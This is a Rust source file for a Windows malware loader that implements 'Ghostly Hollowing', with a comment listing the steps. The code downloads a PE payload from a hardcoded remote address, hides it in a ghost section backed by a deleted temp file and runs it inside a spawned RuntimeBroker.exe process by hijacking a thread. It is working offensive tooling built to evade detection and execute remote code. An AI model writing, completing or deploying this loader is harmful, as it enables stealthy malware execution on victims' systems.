
/*
    Ghostly Hollowing steps
    1. Download Payload
    2. Create an empty file on disk which will be overwritten with the PE payload
    3. Create a ghost section from the delete-pending temp file, close the file handle and deleting it from disk
    4. Create a remote process and map the ghost section
    5. Patch the ImageBaseAddress element of the PEB structure to point to the mapped ghost section.
        Execute the PE payload's entry point via thread hijacking
 */

use std::ffi::{c_void, OsStr};
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use windows_sys::core::PWSTR;
use windows_sys::Win32::Foundation::{HMODULE, MAX_PATH};
use windows_sys::Win32::Storage::FileSystem::{GetTempFileNameW, GetTempPathW};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

mod gcore;
mod utils;
mod types;

const URL: &str = "https://192.168.1.112:4443/";

fn main() {
    let ntdll = b"ntdll\0";
    let s= "C:\\Windows\\system32\\RuntimeBroker.exe coffee";
    let mut wide: Vec<u16> = OsStr::new(s).encode_wide().collect();
    wide.push(0);
    let legit_img: PWSTR = wide.as_mut_ptr();

    unsafe {
        let ntdll_module: HMODULE = GetModuleHandleA(ntdll.as_ptr());
        if ntdll_module == null_mut() {
            eprintln!("[!] Failed to get NTDLL module");
            std::process::exit(-1);
        }

        // Get temp dir path
        let mut tmp_path: [u16; MAX_PATH as usize] = [0; MAX_PATH as usize];
        let res = GetTempPathW(MAX_PATH, tmp_path.as_mut_ptr());
        if res == 0x00 {
            eprintln!("[!] Failed to get temp path");
            std::process::exit(-1);
        }

        // Create a temp file (named szTmpFileName)
        let mut tmp_file_name: [u16; MAX_PATH as usize] = [0; MAX_PATH as usize];
        let prefix = "GH\0".encode_utf16().collect::<Vec<u16>>();
        let res = GetTempFileNameW(
            tmp_path.as_mut_ptr(),
            prefix.as_ptr(),
            0,
            tmp_file_name.as_mut_ptr()
        );
        if res == 0x00 {
            eprintln!("[!] Failed to create temp file name");
            std::process::exit(-1);
        }

        // Convert to NT path format
        let mut nt_path: Vec<u16> = "\\??\\".encode_utf16().collect();
        nt_path.extend(
            tmp_file_name
                .iter()
                .take_while(|c| **c != 0)
                .cloned()
        );
        nt_path.push(0);
        let sz_tmp_file_path: PWSTR = nt_path.as_mut_ptr();
        let nt_str = String::from_utf16_lossy(
            &nt_path[..nt_path.iter().position(|c| *c == 0).unwrap()]
        );
        println!("NT Path: {}", nt_str);

        // Download payload
        let mut pe_bytes = utils::download_file(URL).expect("[!] Could not download file");
        let p_buffer = pe_bytes.as_mut_ptr();

        // Create ghost section
        let ghost_section_handle = gcore::create_ghost_section(
            sz_tmp_file_path,
            p_buffer as *mut c_void,
            pe_bytes.len() as u32
        ).expect("[!] Could not create ghost section");

        // Create ghost process
        gcore::create_ghost_hollowing_process(
            legit_img,
            ghost_section_handle,
            p_buffer
        ).expect("[!] Could not create ghostly hollowing process");
    }
}
